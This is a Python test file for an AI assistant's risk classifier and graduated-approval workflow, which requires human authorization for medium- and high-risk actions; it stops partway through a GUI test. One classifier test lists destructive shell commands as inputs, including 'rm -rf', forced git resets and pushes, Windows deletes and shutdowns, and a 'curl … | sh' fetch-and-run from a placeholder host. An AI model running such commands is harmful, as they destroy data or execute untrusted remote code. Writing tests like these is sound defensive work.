"""Tests for Phase 3 typed planning + graduated autonomy.

Covers the RiskClassifier tiers, the ActionPlanner
(principles -> ActionPlan), registry integration, the graduated
authorization ladder (voice confined to low-risk, GUI + checklist for
medium/high), zero-execution-without-approval gates, the proposal-card
presenters, the Action Proposal Card widget, and the Replicate tab
propose/authorize/reject/modify flow. Qt widget tests run offscreen
only when a Qt binding is installed, otherwise they skip.
"""

import json
import os
import unittest
from unittest import mock

from desktop_app.presenters import (
    format_action_plan,
    format_proposal_summary,
    format_safety_checklist,
    risk_badge,
)
from desktop_app.state import AppState
from mimir.actions import (
    VOICE_GRANTED_PERMISSIONS,
    ActionRegistry,
    ActionStatus,
    RegistryError,
)
from mimir.planning import (
    GUI_GRANTED_PERMISSIONS,
    ActionPlan,
    ActionPlanner,
    PlannedStep,
    PlanningError,
    RiskAssessment,
    RiskClassifier,
    RiskLevel,
    StepKind,
    build_safety_checklist,
    describe_autonomy,
    required_permissions_for_risk,
)
from mimir.principles import (
    BehavioralPrinciple,
    ContextTrigger,
    EpistemicStatus,
)
from mimir.store import PrincipleStore


def _principle(pid="bp_p3_001", confidence=0.85,
               scope="Python test suites",
               invariant="Cover every change with pytest cases.",
               name=None):
    return BehavioralPrinciple(
        id=pid,
        name=name or f"Principle {pid}",
        category="testing",
        context_trigger=ContextTrigger(scope=scope,
                                       language_agnostic=True),
        latent_invariant=invariant,
        anti_patterns=["Skipping tests"],
        epistemic_status=EpistemicStatus(
            confidence_score=confidence,
            supporting_episodes_count=3,
            contradictions_count=0,
            first_inferred="2026-10-12T10:00:00Z",
            last_validated="2026-10-27T08:30:00Z",
        ),
        inspectable_traces=["ep_p3_1"],
    )


def _store(test, *principles):
    store = PrincipleStore(":memory:")
    test.addCleanup(store.close)
    for principle in principles:
        store.save(principle)
    return store


def _state(test, **prefs_kw):
    from desktop_app import DesktopPrefs

    state = AppState(store_path=":memory:")
    if prefs_kw:
        state.prefs = DesktopPrefs(**prefs_kw)
    test.addCleanup(state.close)
    return state


def _needs_qt(test):
    """Skip the test when Qt bindings are unavailable (offscreen)."""
    try:
        from desktop_app.tabs._qt import load_qt
        load_qt()
    except ImportError:
        test.skipTest("PyQt6/PySide6 not installed")
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    from desktop_app.tabs._qt import load_qt
    _, _, _, QtWidgets = load_qt()
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])
    # Keep the QApplication wrapper alive on the test instance: if the
    # last Python reference dies, Qt destroys every widget out from
    # under the test (Phase 2 helper does the same).
    try:
        test._qt_app_ref = app
    except AttributeError:
        pass
    return QtWidgets, app


def _pump(app, ms=120):
    import time
    end = time.monotonic() + ms / 1000.0
    while time.monotonic() < end:
        app.processEvents()
        time.sleep(0.01)
    try:
        from desktop_app.tabs._qt import load_qt
        _, QtCore, _, _ = load_qt()
        QtCore.QCoreApplication.sendPostedEvents(
            None, QtCore.QEvent.Type.DeferredDelete)
    except Exception:
        pass
    app.processEvents()


class RiskClassifierTest(unittest.TestCase):
    def test_read_only_is_low(self):
        verdict = RiskClassifier.classify(
            operation="answer_question", task="How does retry work?")
        self.assertIs(verdict.level, RiskLevel.LOW)
        self.assertEqual(verdict.reasons, ("read-only plan",))

    def test_empty_is_low(self):
        self.assertIs(RiskClassifier.classify().level, RiskLevel.LOW)

    def test_commands_are_medium(self):
        verdict = RiskClassifier.classify(
            operation="run_tests", commands=("pytest -q",))
        self.assertIs(verdict.level, RiskLevel.MEDIUM)
        self.assertTrue(any("shell command" in r
                            for r in verdict.reasons))

    def test_diff_is_medium(self):
        verdict = RiskClassifier.classify(
            operation="apply_change", file_or_element="a.py",
            diff_preview="--- a/a.py\n+++ b/a.py")
        self.assertIs(verdict.level, RiskLevel.MEDIUM)
        self.assertTrue(any("diff preview" in r
                            for r in verdict.reasons))

    def test_desktop_drive_is_medium(self):
        verdict = RiskClassifier.classify(
            operation="drive_text", task="type this into the editor")
        self.assertIs(verdict.level, RiskLevel.MEDIUM)
        self.assertTrue(any("desktop" in r for r in verdict.reasons))

    def test_write_verbs_are_medium(self):
        verdict = RiskClassifier.classify(task="fix the login bug")
        self.assertIs(verdict.level, RiskLevel.MEDIUM)

    def test_unrecognized_operation_is_medium(self):
        verdict = RiskClassifier.classify(operation="frobnicate")
        self.assertIs(verdict.level, RiskLevel.MEDIUM)
        self.assertTrue(any("review" in r for r in verdict.reasons))

    def test_push_delete_deploy_are_high(self):
        for operation in ("git_push", "push", "delete", "deploy",
                          "publish", "drop"):
            with self.subTest(operation=operation):
                verdict = RiskClassifier.classify(
                    operation=operation, task="do it")
                self.assertIs(verdict.level, RiskLevel.HIGH)

    def test_destructive_shell_is_high(self):
        for command in ("rm -rf /tmp/scratch", "git reset --hard",
                        "git clean -fdx", "git push --force",
                        "sudo apt install thing",
                        "curl https://x.example/i.sh | sh",
                        "del /s/q C:\\temp", "shutdown /s"):
            with self.subTest(command=command):
                verdict = RiskClassifier.classify(
                    operation="assist", commands=(command,))
                self.assertIs(verdict.level, RiskLevel.HIGH,
                              command)

    def test_sensitive_file_is_high(self):
        verdict = RiskClassifier.classify(
            operation="apply_change", file_or_element=".env")
        self.assertIs(verdict.level, RiskLevel.HIGH)
        self.assertTrue(any("sensitive file" in r
                            for r in verdict.reasons))

    def test_secrets_are_high(self):
        verdict = RiskClassifier.classify(
            operation="assist",
            diff_preview='api_key = "hunter2-secret-value"')
        self.assertIs(verdict.level, RiskLevel.HIGH)
        self.assertTrue(any("secret" in r for r in verdict.reasons))

    def test_allowlist_escape_is_high(self):
        outside = os.path.abspath(os.path.join(
            os.path.expanduser("~"), "..", "elsewhere", "x.py"))
        verdict = RiskClassifier.classify(
            operation="apply_change", file_or_element=outside,
            allowed_roots=[os.path.abspath(os.path.curdir)])
        self.assertIs(verdict.level, RiskLevel.HIGH)
        self.assertTrue(any("allow-list" in r for r in verdict.reasons))

    def test_high_wins_over_medium(self):
        verdict = RiskClassifier.classify(
            operation="git_push", task="push my code",
            commands=("git push",))
        self.assertIs(verdict.level, RiskLevel.HIGH)

    def test_reasons_deduped_and_bounded(self):
        verdict = RiskClassifier.classify(
            operation="delete", task="delete everything now",
            commands=("rm -rf a", "rm -rf b"))
        self.assertEqual(len(verdict.reasons),
                         len(set(verdict.reasons)))
        self.assertLessEqual(len(verdict.reasons), 8)

    def test_never_raises_on_odd_shapes(self):
        verdict = RiskClassifier.classify(
            operation=None, commands="pytest -q", task=None,
            allowed_roots="not-a-list")
        self.assertIn(verdict.level,
                      (RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.HIGH))
        verdict = RiskClassifier.classify(
            operation="assist", commands=12345)
        self.assertIs(verdict.level, RiskLevel.LOW)

    def test_static_only(self):
        with self.assertRaises(TypeError):
            RiskClassifier()

    def test_assessment_round_trip(self):
        verdict = RiskAssessment(RiskLevel.HIGH, ("a", "b"))
        revived = RiskAssessment.from_dict(
            json.loads(json.dumps(verdict.to_dict())))
        self.assertEqual(revived, verdict)
        with self.assertRaises(PlanningError):
            RiskAssessment("bogus", ())


class RiskPermissionsTest(unittest.TestCase):
    def test_tier_permissions(self):
        self.assertEqual(required_permissions_for_risk("low"),
                         VOICE_GRANTED_PERMISSIONS)
        self.assertEqual(required_permissions_for_risk(RiskLevel.MEDIUM),
                         ("approve:medium",))
        self.assertEqual(required_permissions_for_risk("HIGH"),
                         ("approve:high",))

    def test_invalid_tier_raises(self):
        with self.assertRaises(PlanningError):
            required_permissions_for_risk("bogus")

    def test_gui_grants_cover_every_tier(self):
        for tier in ("low", "medium", "high"):
            required = set(required_permissions_for_risk(tier))
            self.assertTrue(required <= set(GUI_GRANTED_PERMISSIONS))

    def test_voice_grants_cover_low_only(self):
        voice = set(VOICE_GRANTED_PERMISSIONS)
        self.assertTrue(set(required_permissions_for_risk("low")) <= voice)
        self.assertFalse(
            set(required_permissions_for_risk("medium")) <= voice)
        self.assertFalse(
            set(required_permissions_for_risk("high")) <= voice)

    def test_describe_autonomy(self):
        self.assertIn("voice", describe_autonomy("high").lower())
        self.assertIn("checklist",
                      describe_autonomy(RiskLevel.MEDIUM).lower())
        self.assertIn("one approval", describe_autonomy("low").lower())

    def test_checklist_grows_with_risk(self):
        low = build_safety_checklist("low")
        medium = build_safety_checklist("medium", has_diff=True)
        high = build_safety_checklist("high", has_commands=True)
        self.assertLess(len(low), len(medium))
        self.assertLess(len(medium), len(high))
        self.assertTrue(any("E-stop" in item for item in low))
        self.assertTrue(any("Diff preview" in item for item in medium))
        self.assertTrue(any("Backup" in item for item in high))
        redacted = build_safety_checklist(
            "low", redaction_kinds=["api_key"])
        self.assertTrue(any("redacted" in item.lower()
                            for item in redacted))


class ActionPlannerTest(unittest.TestCase):
    def test_empty_task_raises(self):
        with self.assertRaises(ValueError):
            ActionPlanner().plan("   ")

    def test_bad_store_and_roots_raise(self):
        with self.assertRaises(PlanningError):
            ActionPlanner(store="nope")
        with self.assertRaises(PlanningError):
            ActionPlanner(allowed_roots="nope")
        with self.assertRaises(ValueError):
            ActionPlanner().plan("do things", top_k=0)

    def test_generic_plan_without_store(self):
        plan = ActionPlanner().plan("Outline the migration milestones")
        self.assertEqual(plan.operation, "plan_only")
        self.assertIs(plan.risk, RiskLevel.LOW)
        self.assertTrue(plan.plan_id.startswith("plan_"))
        self.assertGreaterEqual(len(plan.steps), 1)
        for step in plan.steps:
            self.assertIsInstance(step, PlannedStep)
            self.assertIsInstance(step.kind, StepKind)
        self.assertEqual(plan.matched_principle_ids, ())
        self.assertEqual(plan.confidence, 0.5)
        self.assertIn("generic", plan.reason)
        self.assertTrue(plan.safety_checklist)

    def test_store_retrieval_grounds_plan(self):
        store = _store(
            self,
            _principle("bp_p3pytest", invariant=(
                "Cover every change with pytest cases.")),
            _principle("bp_p3style", invariant=(
                "Format with black before every commit.")),
        )
        plan = ActionPlanner(store).plan(
            "cover my change with pytest cases")
        self.assertIn("bp_p3pytest", plan.matched_principle_ids)
        self.assertEqual(len(plan.matched_principle_ids),
                         len(plan.matched_principle_names))
        self.assertGreater(plan.confidence, 0.5)
        self.assertIn("bp_p3pytest", plan.reason)

    def test_operation_inference(self):
        planner = ActionPlanner()
        self.assertEqual(planner.plan("Push my code").operation,
                         "git_push")
        self.assertEqual(planner.plan("commit the fix").operation,
                         "git_commit")
        self.assertEqual(planner.plan("run the pytest suite").operation,
                         "run_tests")
        self.assertEqual(
            planner.plan("How does the retry helper work?").operation,
            "answer_question")
        self.assertEqual(
            planner.plan("Refactor the auth module").operation,
            "apply_change")
        self.assertEqual(
            planner.plan("Delete the temp files").operation, "delete")
        self.assertEqual(
            planner.plan("Deploy to production").operation, "deploy")
        self.assertEqual(
            planner.plan("Outline the migration roadmap").operation,
            "plan_only")
        explicit = planner.plan("do it", operation="run_tests")
        self.assertEqual(explicit.operation, "run_tests")

    def test_commands_prefilled_conservatively(self):
        planner = ActionPlanner()
        push = planner.plan("Push my code")
        self.assertIn("git push", push.commands)
        tests = planner.plan("run the pytest suite")
        self.assertEqual(tests.commands, ("pytest -q",))
        js = planner.plan("run the pytest suite",
                          target_language="typescript")
        self.assertEqual(js.commands, ("npm test",))
        # High-impact operations carry no prefilled commands.
        self.assertEqual(
            planner.plan("Delete the temp files").commands, ())
        self.assertEqual(
            planner.plan("Deploy to production").commands, ())

    def test_diff_preview_skeleton(self):
        planner = ActionPlanner()
        plan = planner.plan("Refactor the auth module",
                            file_or_element="auth/login.py")
        self.assertIn("--- a/login.py", plan.diff_preview)
        self.assertIn("preview only", plan.diff_preview)
        self.assertNotIn("/abs/path", plan.diff_preview)
        nofile = planner.plan("Refactor the auth module")
        self.assertIn("Modify", nofile.diff_preview)
        question = planner.plan("How does retry work?")
        self.assertEqual(question.diff_preview, "")

    def test_risk_and_permissions_follow_classification(self):
        planner = ActionPlanner()
        push = planner.plan("Push my code")
        self.assertIs(push.risk, RiskLevel.HIGH)
        self.assertEqual(push.required_permissions, ("approve:high",))
        edit = planner.plan("Refactor the auth module",
                            file_or_element="auth/login.py")
        self.assertIs(edit.risk, RiskLevel.MEDIUM)
        self.assertEqual(edit.required_permissions, ("approve:medium",))
        question = planner.plan("How does retry work?")
        self.assertIs(question.risk, RiskLevel.LOW)
        self.assertEqual(question.required_permissions,
                         VOICE_GRANTED_PERMISSIONS)

    def test_secret_task_scores_high(self):
        plan = ActionPlanner().plan(
            "rotate this credential api_key = \"hunter2-value\"")
        self.assertIs(plan.risk, RiskLevel.HIGH)
        self.assertTrue(any("secret" in reason
                            for reason in plan.risk_reasons))

    def test_target_defaults(self):
        planner = ActionPlanner()
        plan = planner.plan("Refactor it", file_or_element="a.py")
        self.assertEqual(plan.target, "a.py")
        scoped = planner.plan("Refactor it", target_scope="Proj")
        self.assertEqual(scoped.target, "Proj")
        explicit = planner.plan("Refactor it", target="T",
                                file_or_element="a.py")
        self.assertEqual(explicit.target, "T")

    def test_plan_round_trip(self):
        plan = ActionPlanner().plan(
            "Refactor the auth module", file_or_element="auth/login.py")
        revived = ActionPlan.from_dict(
            json.loads(json.dumps(plan.to_dict())))
        self.assertEqual(revived, plan)

    def test_step_and_plan_validation(self):
        with self.assertRaises(PlanningError):
            PlannedStep("bogus", "title")
        with self.assertRaises(ValueError):
            PlannedStep("inspect", "  ")
        step = PlannedStep("inspect", "Look")
        self.assertEqual(
            PlannedStep.from_dict(step.to_dict()), step)
        with self.assertRaises(PlanningError):
            ActionPlan(task="t", operation="assist", steps=[])
        with self.assertRaises(PlanningError):
            ActionPlan(task="t", operation="assist", steps=[step],
                       matched_principle_ids=("a",),
                       matched_principle_names=())
        with self.assertRaises(PlanningError):
            ActionPlan(task="t", operation="assist", steps=[step],
                       confidence=0.0)

    def test_propose_validation(self):
        planner = ActionPlanner()
        plan = planner.plan("How does retry work?")
        with self.assertRaises(PlanningError):
            ActionPlanner.propose("nope", ActionRegistry())
        with self.assertRaises(PlanningError):
            ActionPlanner.propose(plan, "nope")


class RegistryPlanningTest(unittest.TestCase):
    def test_propose_carries_plan_metadata(self):
        from mimir.events import EventBus, EventType

        bus = EventBus()
        seen = []
        bus.subscribe(EventType.ACTION_PROPOSED,
                      lambda event: seen.append(event),
                      name="test-collector")
        registry = ActionRegistry(bus=bus)
        plan = ActionPlanner().plan(
            "Refactor the auth module", file_or_element="auth/login.py")
        spec = ActionPlanner.propose(plan, registry)
        self.assertEqual(spec.status, ActionStatus.PENDING)
        self.assertEqual(spec.risk, "medium")
        self.assertEqual(spec.plan_id, plan.plan_id)
        self.assertEqual(spec.commands, plan.commands)
        self.assertEqual(spec.diff_preview, plan.diff_preview)
        self.assertEqual(spec.safety_checklist, plan.safety_checklist)
        self.assertEqual(spec.required_permissions, ("approve:medium",))
        dumped = spec.to_dict()
        self.assertEqual(dumped["risk"], "medium")
        self.assertEqual(dumped["plan_id"], plan.plan_id)
        self.assertEqual(len(seen), 1)
        payload = seen[0].payload
        self.assertEqual(payload["risk"], "medium")
        self.assertEqual(payload["plan_id"], plan.plan_id)
        self.assertIn("commands", payload)

    def test_invalid_risk_raises(self):
        registry = ActionRegistry()
        with self.assertRaises(RegistryError):
            registry.propose("push", risk="bogus")

    def test_legacy_propose_defaults(self):
        spec = ActionRegistry().propose("push code")
        self.assertEqual(spec.risk, "low")
        self.assertEqual(spec.plan_id, "")
        self.assertEqual(spec.commands, ())
        self.assertEqual(spec.diff_preview, "")
        self.assertEqual(spec.matched_principle_ids, ())
        self.assertEqual(spec.safety_checklist, ())


class GraduatedAutonomyTest(unittest.TestCase):
    def _planned(self, state, task, **kwargs):
        plan = state.plan_task(task, **kwargs)
        return state.propose_plan(plan)

    def test_voice_authorizes_low_only(self):
        state = _state(self)
        low = self._planned(state, "How does retry work?")
        medium = self._planned(state, "Refactor the auth module")
        high = self._planned(state, "Push my code")
        ok = state.action_registry.authorize(
            low.action_id, granted_permissions=VOICE_GRANTED_PERMISSIONS)
        self.assertTrue(ok.ok)
        for spec in (medium, high):
            denied = state.action_registry.authorize(
                spec.action_id,
                granted_permissions=VOICE_GRANTED_PERMISSIONS)
            self.assertFalse(denied.ok)
            self.assertIn("permission", denied.reason)
            current = state.action_registry.get(spec.action_id)
            assert current is not None
            self.assertEqual(current.status, ActionStatus.PENDING)

    def test_gui_authorize_requires_checklist_for_med_high(self):
        state = _state(self)
        medium = self._planned(state, "Refactor the auth module")
        high = self._planned(state, "Push my code")
        low = self._planned(state, "How does retry work?")
        self.assertTrue(state.authorize_proposal(low.action_id).ok)
        gated = state.authorize_proposal(medium.action_id)
        self.assertFalse(gated.ok)
        self.assertIn("checklist", gated.reason)
        self.assertTrue(state.authorize_proposal(
            medium.action_id, checklist_ack=True).ok)
        self.assertTrue(state.authorize_proposal(
            high.action_id, checklist_ack=True).ok)
        unknown = state.authorize_proposal("action_missing")
        self.assertFalse(unknown.ok)

    def test_zero_execution_without_approval(self):
        state = _state(self)
        medium = self._planned(state, "Refactor the auth module")
        high = self._planned(state, "Push my code")
        calls = []
        # No checklist ack: the executor is never reached.
        ok, message = state.authorize_and_execute(
            medium.action_id, executor=calls.append)
        self.assertFalse(ok)
        self.assertIn("checklist", message)
        self.assertEqual(calls, [])
        # With ack the executor runs exactly once.
        ran = []

        def _executor(spec):
            ran.append(spec.action_id)
            return (True, "patched")

        ok, message = state.authorize_and_execute(
            medium.action_id, checklist_ack=True, executor=_executor)
        self.assertTrue(ok)
        self.assertEqual(message, "patched")
        self.assertEqual(ran, [medium.action_id])
        current = state.action_registry.get(medium.action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.COMPLETED)
        # High-risk refusal mentions the checklist too.
        ok, message = state.authorize_and_execute(high.action_id)
        self.assertFalse(ok)
        self.assertIn("checklist", message)

    def test_executor_failure_and_crash(self):
        state = _state(self)
        first = self._planned(state, "Refactor the auth module")
        ok, message = state.authorize_and_execute(
            first.action_id, checklist_ack=True,
            executor=lambda spec: (False, "tests red"))
        self.assertFalse(ok)
        self.assertEqual(message, "tests red")
        current = state.action_registry.get(first.action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.FAILED)
        second = self._planned(state, "Refactor the auth module")

        def _boom(spec):
            raise RuntimeError("drive exploded")

        ok, message = state.authorize_and_execute(
            second.action_id, checklist_ack=True, executor=_boom)
        self.assertFalse(ok)
        self.assertIn("Execution failed", message)
        current = state.action_registry.get(second.action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.FAILED)

    def test_read_only_completes_without_executor(self):
        state = _state(self)
        low = self._planned(state, "How does retry work?")
        ok, message = state.authorize_and_execute(low.action_id)
        self.assertTrue(ok)
        self.assertIn("read-only", message)
        current = state.action_registry.get(low.action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.COMPLETED)

    def test_effectful_plan_defers_without_executor(self):
        state = _state(self)
        medium = self._planned(state, "Refactor the auth module")
        ok, message = state.authorize_and_execute(
            medium.action_id, checklist_ack=True)
        self.assertTrue(ok)
        self.assertIn("deferred", message)
        current = state.action_registry.get(medium.action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.AUTHORIZED)

    def test_safety_latch_blocks_execution(self):
        state = _state(self)
        low = self._planned(state, "How does retry work?")
        state.safety.trip(source="test", reason="latched")
        ok, message = state.authorize_and_execute(
            low.action_id, executor=lambda spec: (True, "x"))
        self.assertFalse(ok)
        self.assertIn("Safety stop", message)
        current = state.action_registry.get(low.action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.PENDING)

    def test_unknown_and_settled_actions(self):
        state = _state(self)
        ok, message = state.authorize_and_execute("action_missing")
        self.assertFalse(ok)
        self.assertIn("Unknown", message)
        low = self._planned(state, "How does retry work?")
        self.assertTrue(state.authorize_and_execute(low.action_id)[0])
        ok, message = state.authorize_and_execute(low.action_id)
        self.assertFalse(ok)
        self.assertIn("already", message)

    def test_reject_proposal(self):
        state = _state(self)
        spec = self._planned(state, "Push my code")
        self.assertTrue(state.reject_proposal(spec.action_id))
        current = state.action_registry.get(spec.action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.CANCELLED)
        self.assertFalse(state.reject_proposal("action_missing"))

    def test_exported_from_package(self):
        import mimir

        self.assertIs(mimir.ActionPlanner, ActionPlanner)
        self.assertIs(mimir.RiskClassifier, RiskClassifier)
        self.assertIs(mimir.RiskLevel, RiskLevel)


class GitPushGateTest(unittest.TestCase):
    def test_execute_refuses_without_authorization(self):
        import subprocess
        import tempfile

        state = _state(self)
        with tempfile.TemporaryDirectory() as tmp:
            prop = state.propose_git_push(repo_path=tmp)
            spec = state.action_registry.get(prop["action_id"])
            assert spec is not None
            self.assertEqual(spec.risk, "high")
            with mock.patch.object(
                    subprocess, "run",
                    side_effect=AssertionError("must not spawn")):
                ok, message = state.execute_git_push(
                    prop["action_id"], prop["repo_dir"],
                    prop["remote"], prop["branch"])
        self.assertFalse(ok)
        self.assertIn("not authorized", message)

    def test_execute_runs_once_authorized(self):
        import subprocess
        import tempfile

        state = _state(self)
        with tempfile.TemporaryDirectory() as tmp:
            prop = state.propose_git_push(repo_path=tmp)
            outcome = state.action_registry.authorize(
                prop["action_id"],
                authorization_type="explicit_confirmation",
                granted_permissions=("git_push", "workspace_write"))
            self.assertTrue(outcome.ok)
            good = subprocess.CompletedProcess(
                ["git", "push"], 0, stdout="ok\n", stderr="")
            with mock.patch.object(
                    subprocess, "run", return_value=good) as run:
                ok, message = state.execute_git_push(
                    prop["action_id"], prop["repo_dir"],
                    prop["remote"], prop["branch"])
            run.assert_called_once()
        self.assertTrue(ok)
        self.assertIn("ok", message)
        current = state.action_registry.get(prop["action_id"])
        assert current is not None
        self.assertEqual(current.status, ActionStatus.COMPLETED)

    def test_execute_reports_push_failure(self):
        import subprocess
        import tempfile

        state = _state(self)
        with tempfile.TemporaryDirectory() as tmp:
            prop = state.propose_git_push(repo_path=tmp)
            state.action_registry.authorize(
                prop["action_id"],
                granted_permissions=("git_push", "workspace_write"))
            bad = subprocess.CompletedProcess(
                ["git", "push"], 1, stdout="", stderr="rejected")
            with mock.patch.object(subprocess, "run", return_value=bad):
                ok, message = state.execute_git_push(prop["action_id"])
        self.assertFalse(ok)
        self.assertIn("rejected", message)
        current = state.action_registry.get(prop["action_id"])
        assert current is not None
        self.assertEqual(current.status, ActionStatus.FAILED)


class PresenterTest(unittest.TestCase):
    def test_risk_badge(self):
        self.assertEqual(risk_badge("low"), ("Low risk", "confirmed"))
        self.assertEqual(risk_badge(RiskLevel.MEDIUM),
                         ("Medium risk", "learning"))
        self.assertEqual(risk_badge("HIGH"), ("High risk", "unconfirmed"))
        self.assertEqual(risk_badge("bogus"), ("Low risk", "confirmed"))

    def test_format_safety_checklist(self):
        text = format_safety_checklist(["first", "second"])
        self.assertIn("[ ] first", text)
        self.assertIn("[ ] second", text)
        self.assertIn("(none recorded)", format_safety_checklist([]))

    def test_format_action_plan(self):
        plan = ActionPlanner().plan(
            "Refactor the auth module", file_or_element="auth/login.py")
        text = format_action_plan(plan)
        for fragment in ("Plan ", "Task: Refactor", "Risk: medium",
                         "Steps (3)", "Diff preview:",
                         "Safety checklist:", "Matched principles",
                         "Requires: approve:medium"):
            self.assertIn(fragment, text)
        # Dicts (to_dict payloads) render identically.
        self.assertIn("Risk: medium",
                      format_action_plan(plan.to_dict()))
        self.assertEqual(format_action_plan(None), "(no plan)")

    def test_format_proposal_summary(self):
        registry = ActionRegistry()
        plan = ActionPlanner().plan("Push my code")
        spec = ActionPlanner.propose(plan, registry)
        text = format_proposal_summary(spec)
        self.assertIn(spec.action_id, text)
        self.assertIn("git_push", text)
        self.assertIn("high risk", text)
        self.assertIn("pending", text)
        self.assertEqual(format_proposal_summary(None), "(no proposal)")


class ProposalCardTest(unittest.TestCase):
    def _card(self, QtWidgets, task, **kwargs):
        from desktop_app.tabs.proposal_card import build_proposal_card

        plan = ActionPlanner().plan(task, **kwargs)
        spec = ActionPlanner.propose(plan, ActionRegistry())
        box = build_proposal_card(plan, action_id=spec.action_id)
        self.addCleanup(box.close)
        return box, plan, spec

    def _buttons(self, QtWidgets, box):
        return {button.text(): button
                for button in box.findChildren(QtWidgets.QPushButton)}

    def test_low_risk_card_sections_and_actions(self):
        QtWidgets, _app = _needs_qt(self)
        box, plan, spec = self._card(
            QtWidgets, "How does the retry helper work?")
        buttons = self._buttons(QtWidgets, box)
        self.assertIn("Authorize & Execute", buttons)
        self.assertIn("Modify", buttons)
        self.assertIn("Reject", buttons)
        self.assertTrue(buttons["Authorize & Execute"].isEnabled())
        labels = [label.text() for label in
                  box.findChildren(QtWidgets.QLabel)]
        blob = "\n".join(labels)
        self.assertIn("ACTION PROPOSAL", blob)
        self.assertIn("Low risk", blob)
        self.assertIn("generic plan", blob)
        self.assertIn("answer_question", blob)

    def test_medium_risk_requires_checklist(self):
        QtWidgets, _app = _needs_qt(self)
        box, _plan, _spec = self._card(
            QtWidgets, "Refactor the auth module",
            file_or_element="auth/login.py")
        buttons = self._buttons(QtWidgets, box)
        authorize = buttons["Authorize & Execute"]
        self.assertFalse(authorize.isEnabled())
        for check in box.checkboxes:
            check.setChecked(True)
        self.assertTrue(authorize.isEnabled())
        box.checkboxes[0].setChecked(False)
        self.assertFalse(authorize.isEnabled())
        # The diff preview and steps render on the card.
        self.assertIn("--- a/login.py", box.diff_view.toPlainText())
        labels = "\n".join(label.text() for label in
                           box.findChildren(QtWidgets.QLabel))
        self.assertIn("[inspect]", labels)
        self.assertIn("[edit]", labels)

    def test_high_risk_card_from_spec_dict(self):
        QtWidgets, _app = _needs_qt(self)
        from desktop_app.tabs.proposal_card import (
            build_proposal_card,
            proposal_checklist_ack,
            set_proposal_busy,
        )

        plan = ActionPlanner().plan("Push my code")
        spec = ActionPlanner.propose(plan, ActionRegistry())
        box = build_proposal_card(spec.to_dict(),
                                  action_id=spec.action_id)
        self.addCleanup(box.close)
        buttons = self._buttons(QtWidgets, box)
        self.assertIn("High risk", "\n".join(
            label.text()
            for label in box.findChildren(QtWidgets.QLabel)))
        self.assertFalse(buttons["Authorize & Execute"].isEnabled())
        self.assertFalse(proposal_checklist_ack(box))
        for check in box.checkboxes:
            check.setChecked(True)
        self.assertTrue(proposal_checklist_ack(box))
        self.assertTrue(buttons["Authorize & Execute"].isEnabled())
        set_proposal_busy(box, True)
        self.assertFalse(buttons["Modify"].isEnabled())
        set_proposal_busy(box, False)
        self.assertTrue(buttons["Modify"].isEnabled())

    def test_card_callbacks_fire(self):
        QtWidgets, app = _needs_qt(self)
        from desktop_app.tabs.proposal_card import build_proposal_card

        fired = []
        plan = ActionPlanner().plan("How does retry work?")
        box = build_proposal_card(
            plan, action_id="action_demo",
            on_authorize=lambda: fired.append("authorize"),
            on_reject=lambda: fired.append("reject"),
            on_modify=lambda: fired.append("modify"))
        self.addCleanup(box.close)
        buttons = self._buttons(QtWidgets, box)
        buttons["Authorize & Execute"].click()
        buttons["Modify"].click()
        buttons["Reject"].click()
        _pump(app)
        self.assertEqual(fired, ["authorize", "modify", "reject"])


class ReplicateProposalFlowTest(unittest.TestCase):
    def _build(self, QtWidgets, state, status):
        from desktop_app.tabs.replicate import build_replicate_tab

        root = build_replicate_tab(state, status)
        self.addCleanup(root.close)
        return root

    def _status(self):
        class _Status:
            def __init__(self):
                self.messages = []

            def showMessage(self, text, timeout=0):
                self.messages.append(text)

        return _Status()

    def _task_edit(self, QtWidgets, root):
        edits = root.findChildren(QtWidgets.QTextEdit)
        self.assertTrue(edits)
        return edits[0]

    def _click(self, QtWidgets, root, text):
        button = next(button for button in
                      root.findChildren(QtWidgets.QPushButton)
                      if button.text() == text)
        button.click()
        return button

    def _authorize_buttons(self, QtWidgets, root):
        return [button for button in
                root.findChildren(QtWidgets.QPushButton)
                if button.text() == "Authorize & Execute"]

    def test_propose_button_arms_and_rejects(self):
        QtWidgets, app = _needs_qt(self)
        state = _state(self)
        status = self._status()
        root = self._build(QtWidgets, state, status)
        propose = next(button for button in
                       root.findChildren(QtWidgets.QPushButton)
                       if button.text() == "Propose action")
        # Proposing needs no prior Generate: it plans from the prompt.
        self.assertTrue(propose.isEnabled())
        self._task_edit(QtWidgets, root).setPlainText("Push my code")
        propose.click()
        _pump(app)
        pending = state.action_registry.list_pending()
        self.assertEqual(len(pending), 1)
        self.assertEqual(pending[0].operation, "git_push")
        self.assertEqual(pending[0].risk, "high")
        cards = self._authorize_buttons(QtWidgets, root)
        self.assertEqual(len(cards), 1)
        self.assertFalse(cards[0].isEnabled())
        self.assertTrue(any("high risk" in message
                            for message in status.messages))
        self._click(QtWidgets, root, "Reject")
        _pump(app)
        self.assertEqual(len(state.action_registry.list_pending()), 0)
        current = state.action_registry.get(pending[0].action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.CANCELLED)
        self.assertEqual(self._authorize_buttons(QtWidgets, root), [])

    def test_propose_modify_returns_task_to_prompt(self):
        QtWidgets, app = _needs_qt(self)
        state = _state(self)
        root = self._build(QtWidgets, state, self._status())
        self._task_edit(QtWidgets, root).setPlainText(
            "Refactor the auth module")
        self._click(QtWidgets, root, "Propose action")
        _pump(app)
        pending = state.action_registry.list_pending()
        self.assertEqual(len(pending), 1)
        self._task_edit(QtWidgets, root).setPlainText("something else")
        self._click(QtWidgets, root, "Modify")
        _pump(app)
        self.assertIn("Refactor the auth module",
                      self._task_edit(QtWidgets, root).toPlainText())
        current = state.action_registry.get(pending[0].action_id)
        assert current is not None
        self.assertEqual(current.status, ActionStatus.CANCELLED)

    def test_low_risk_authorize_completes(self):
        QtWidgets, app = _needs_qt(self)
        state = _state(self)
        status = self._status()
        root = self._build(QtWidgets, state, status)
        self._task_edit(QtWidgets, root).setPlainText(
            "How does the retry helper work?")
        self._click(QtWidgets, root, "Propose action")
        _pump(app)
